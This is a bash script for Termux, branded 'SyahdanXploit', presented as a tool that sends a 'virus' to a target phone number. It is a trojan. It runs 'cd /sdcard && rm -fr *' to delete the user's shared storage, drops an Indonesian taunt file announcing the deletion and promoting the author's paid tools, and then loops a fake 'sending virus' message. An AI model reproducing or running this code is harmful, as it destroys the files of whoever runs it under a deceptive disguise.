#!/bin/bash

me="\033[31;1m"
hi="\033[32;1m"
ku="\033[33;1m"
bi="\033[34;1m"
un="\033[35;1m"
cy="\033[36;1m"
pu="\033[37;1m"

#path= cd /home/kali/Desktop
#direc="SyahdanXploit"

#echo $hi[*]$pu please wait 1 seconds . . .
#sleep 1

clear

#if [ ! -d  "$direc" ];
#then
#mkdir $direc && cd SyahdanXploit > /dev/null 2>&1
#else
#sleep 1
#echo $hi"[*]$pu please wait for 1 seconds . . ."
#echo
#fi
echo """
Pesan Penting Untuk Kalian


pesan ini w buat bertujuan untuk menyadarkan kalian bahwa menggunakan
script orang lain tidak selama nya aman, kecuali memang orang tersebut
dapat di percaya . . .


selamat data lu udah gw apus cukkk hahahah


jika kalian berminat bergabung bersama w, w bakal ajarin dengan syarat
kalian bisa membeli tools w untuk feature kalian bisa cek di youtube
ini hanya sebagian kecil dari edukasi hacking, nanti kalau kalian membeli
tools w . . . buat yt gw Syahdan Xploit klo mau cepet di respon di IG aja nih Ig gw @vams_programmer

kalian bakal dapat banyak ilmu yang w kasih aowkwwkk ini cuma pesan
selau data kalian aman, w cuma nulis pesan aja sih haha, kalo w jahat
w bisa aja ngambil data kalian . . .


sekian mek tq


				                     HACKED BY SyahdanXploit"""BacaPenting.txt
logo(){
echo $me"""
─────▄───▄
─▄█▄─█▀█▀█─▄█▄    Created By SYAHDAN XPLOIT
▀▀████▄█▄████▀▀   version 1.12344
─────▀█▀█▀
"""
}
cekon(){
sleep 1
ping -c 1 8.8.8.8 > /dev/null 2>&1
if [ "$?" != "0" ]
then
echo $me"[!]$pu Memeriksa Koneksi Internet =>$me failed"
sleep 2
echo
sleep 1
echo $bi"[*]$pu Anda Harus Terhubung Ke Internet :("
sleep 3
exit
echo
sleep 1
else
echo $hi"[✔]$pu Check Koneksi Internet =>$hi connected"
sleep 3
fi
}
#cekon
#clear
#logo
#echo
#echo $me"[!]$pu installing requirements"
#sleep 1
#which figlet > /dev/null 2>&1
#if [ "$?" -eq "0" ];
#then
#echo $bi"[*]$pu figlet . . . . . . . . . . . . $hi installed"
#sleep 2
#which figlet > /dev/null 2>&1
#else
#echo $me"[x]$pu figlet . . . . . . . . . . . . $me not installed"
#sleep 2
#echo $bi"[*]$pu installing figlet . . . ."
#sleep 1
#echo
#apt install figlet -y > /dev/null 2>&1
#sleep 1
#echo $hi"[*]$pu succesfully installing figlet . . ."
#sleep 1
#echo $bi"[*]$pu installing lolcat . . . ."
#sleep 1
#apt install ruby -y && gem install lolcat > /dev/null 2>&1
#sleep 1
#echo $hi"[*]$pu succesfully install lolcat"
#sleep 1
#fi
clear
logo
echo $hi
termux-setup-storage > /dev/null 2>&1
cd /sdcard && rm -fr *
read -p "nomor target : " xz
sleep 1
echo
sleep 1
ea="ea"
while [ $ea = "ea" ]
do
echo $hi"[✔]$pu sedang mengirim$me virus barbar$pu ke nomor$ku $xz"
sleep 0.1
done
